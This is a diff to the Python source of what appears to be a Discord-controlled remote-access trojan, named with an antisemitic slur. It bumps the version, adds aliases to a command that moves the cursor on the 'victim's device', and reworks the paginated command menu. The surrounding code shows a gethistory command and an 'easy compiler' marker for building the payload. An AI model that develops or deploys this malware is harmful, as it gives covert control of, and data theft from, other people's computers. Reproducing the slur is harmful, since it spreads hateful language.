@@ -47,7 +47,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.5" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.6" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1714,7 +1714,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
     except Exception as e:
         await ctx.send(f"Error sending message: {e}")
 
-@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display.", usage="$setpos <x> <y>")
+@bot.command(aliases=["mpos", "pos"], help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display.", usage="$setpos <x> <y>")
 async def setpos(ctx, x: int, y: int):
     try:
         pyautogui.moveTo(x, y)
@@ -2373,7 +2373,6 @@ async def commands(ctx, page: int = 1):
         page_cmds = commands_list[start:end]
 
         embed = discord.Embed(title="Available Commands", description="List of all commands", color=0x007BFF)
-
         for cmd in page_cmds:
             primary = cmd.name
             aliases = list(cmd.aliases) if getattr(cmd, "aliases", None) else []
@@ -2399,20 +2398,28 @@ async def commands(ctx, page: int = 1):
         await message.add_reaction("◀️")
         await message.add_reaction("▶️")
 
-    while True:
-        try:
-            check = user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id
-            reaction, user = await bot.wait_for("reaction_add", check=check)
-            await message.remove_reaction(reaction, user)
+        def reaction_check(reaction, u):
+            return (
+                u == ctx.author
+                and str(reaction.emoji) in ("◀️", "▶️")
+                and reaction.message.id == message.id
+            )
 
-            if str(reaction.emoji) == "◀️" and page > 1:
-                page -= 1
-            elif str(reaction.emoji) == "▶️" and page < max_page:
-                page += 1
+        while True:
+            try:
+                reaction, u = await bot.wait_for("reaction_add", timeout=120, check=reaction_check)
+                if str(reaction.emoji) == "◀️" and page > 1:
+                    page -= 1
+                elif str(reaction.emoji) == "▶️" and page < max_page:
+                    page += 1
 
-            await message.edit(embed=render_page(page))
-        except asyncio.TimeoutError:
-            break
+                await message.edit(embed=render_page(page))
+                try:
+                    await message.remove_reaction(reaction.emoji, u)
+                except Exception as e:
+                    print(e)
+            except asyncio.TimeoutError:
+                break
 
 @bot.command(help="Force stops the bot.", usage="$estop")
 async def estop(ctx):
